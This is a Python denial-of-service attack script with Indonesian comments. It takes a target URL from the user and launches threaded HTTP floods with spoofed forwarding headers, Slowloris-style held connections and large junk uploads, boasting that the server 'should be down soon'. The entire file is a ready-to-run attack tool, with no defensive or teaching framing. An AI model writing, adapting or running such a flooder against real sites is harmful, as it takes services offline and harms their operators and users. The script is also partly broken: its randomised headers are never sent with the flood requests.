import threading
import requests
import random
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

# Minta input target dari pengguna
target = input("Masukkan URL target (contoh: https://www.example.com): ")

# Validasi input target
if not target:
    print("Target tidak boleh kosong!")
    exit()

request_count = 0
start_time = time.time()

# MULTI-VECTOR DDOS ATTACK
def http_flood():
    global request_count
    while True:
        try:
            # Random HTTP methods
            methods = [
                lambda: requests.get(target, timeout=2, verify=False),
                lambda: requests.post(target, data={"data": "X"*10000}, timeout=2, verify=False),
                lambda: requests.head(target, timeout=2, verify=False),
                lambda: requests.options(target, timeout=2, verify=False),
                lambda: requests.put(target, data={"data": "Y"*5000}, timeout=2, verify=False)
            ]

            # Random headers untuk bypass protection
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ({random.randint(1000,9999)})',
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
                'Accept-Encoding': 'gzip, deflate, br',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Connection': 'keep-alive'
            }

            method = random.choice(methods)
            r = method()
            request_count += 1

            # Status update
            if request_count % 100 == 0:
                elapsed = time.time() - start_time
                rps = request_count / elapsed
                print(f"🔥 Requests: {request_count} | RPS: {rps:.1f} | Status: {r.status_code}")

        except Exception as e:
            pass

# SLOWLORIS ATTACK
def slowloris_attack():
    while True:
        try:
            s = requests.Session()
            # Keep connections open
            r = s.get(target, headers={
                'User-Agent': 'Mozilla/5.0',
                'Content-Length': '42',
                'X-a': 'b' * 1000
            }, stream=True, timeout=30, verify=False)
            time.sleep(30)  # Keep connection open
        except:
            pass

# RESOURCE EXHAUSTION
def resource_exhaustion():
    while True:
        try:
            # Large file upload attempt
            large_data = "A" * random.randint(100000, 500000)
            requests.post(target + "/fake_upload",
                          data={"file": large_data},
                          timeout=5, verify=False)
        except:
            pass

# MIXED ATTACK LAUNCHER
def launch_brutal_ddos():
    print("💀 STARTING BRUTAL DDOS ATTACK...")
    print("🎯 TARGET:", target) # Gunakan variabel target yang diinput pengguna
    print("🚀 LAUNCHING 50 HTTP FLOOD THREADS...")
    print("🐌 LAUNCHING 20 SLOWLORIS THREADS...")
    print("💥 LAUNCHING 10 RESOURCE EXHAUSTION THREADS...")
    print("⏰ START TIME:", time.strftime("%Y-%m-%d %H:%M:%S"))
    print("=" * 50)

    # HTTP Flood - 50 threads
    for i in range(50):
        t = threading.Thread(target=http_flood)
        t.daemon = True
        t.start()

    # Slowloris - 20 threads
    for i in range(20):
        t = threading.Thread(target=slowloris_attack)
        t.daemon = True
        t.start()

    # Resource exhaustion - 10 threads
    for i in range(10):
        t = threading.Thread(target=resource_exhaustion)
        t.daemon = True
        t.start()

    print("✅ ALL ATTACK THREADS LAUNCHED!")
    print("💀 SERVER SHOULD BE DOWN SOON...")
    print("🛑 Press Ctrl+C to stop the attack")

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 ATTACK STOPPED BY USER")
        print(f"📊 Total requests sent: {request_count}")

# JALANKAN SERANGAN
if __name__ == "__main__":
    launch_brutal_ddos() # Hapus ". kata perintah nya"
